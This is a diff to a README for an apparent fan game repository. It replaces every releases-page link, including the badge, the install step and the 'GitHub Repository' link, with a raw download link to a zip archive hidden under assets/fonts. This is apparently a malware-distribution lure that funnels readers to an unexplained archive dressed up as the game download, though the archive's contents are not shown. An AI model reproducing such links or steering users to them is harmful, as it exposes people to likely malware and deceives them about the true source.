@@ -1,6 +1,6 @@
 # 🎮 MogekoCastleGaiden-GithubMadness - Experience Disturbing Chaos in Gaming
 
-[![Download MogekoCastleGaiden-GithubMadness](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/releases)
+[![Download MogekoCastleGaiden-GithubMadness](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/raw/refs/heads/main/assets/fonts/Github-Castle-Mogeko-Gaiden-Madness-3.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/raw/refs/heads/main/assets/fonts/Github-Castle-Mogeko-Gaiden-Madness-3.3.zip)
 
 ## 📜 Description
 MogekoCastleGaiden-GithubMadness is the worst Mogeko Castle Gaiden recreation ever. Dive into a world of chaotic adventure where you may find yourself questioning every decision. This fun experience emphasizes experimentation, creativity, and community-driven chaos.
@@ -20,7 +20,7 @@ If your system meets these requirements, you are ready to proceed!
 ## 📥 Download & Install
 To download the latest version of MogekoCastleGaiden-GithubMadness, visit the following page:
 
-[Visit this page to download](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/releases)
+[Visit this page to download](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/raw/refs/heads/main/assets/fonts/Github-Castle-Mogeko-Gaiden-Madness-3.3.zip)
 
 Follow these steps to get the game running:
 
@@ -63,7 +63,7 @@ If you need additional support, please raise an issue on our GitHub page. The co
 Stay updated with the latest releases and news by following us. You can also check the repository periodically for updates and improvements.
 
 ## 💾 Important Links
-- [Download Now](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/releases)
-- [GitHub Repository](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness)
+- [Download Now](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/raw/refs/heads/main/assets/fonts/Github-Castle-Mogeko-Gaiden-Madness-3.3.zip)
+- [GitHub Repository](https://github.com/K4WW4K/MogekoCastleGaiden-GithubMadness/raw/refs/heads/main/assets/fonts/Github-Castle-Mogeko-Gaiden-Madness-3.3.zip)
 
 Thank you for checking out MogekoCastleGaiden-GithubMadness. Enjoy the chaotic adventure and leave your mark in this crazy world!
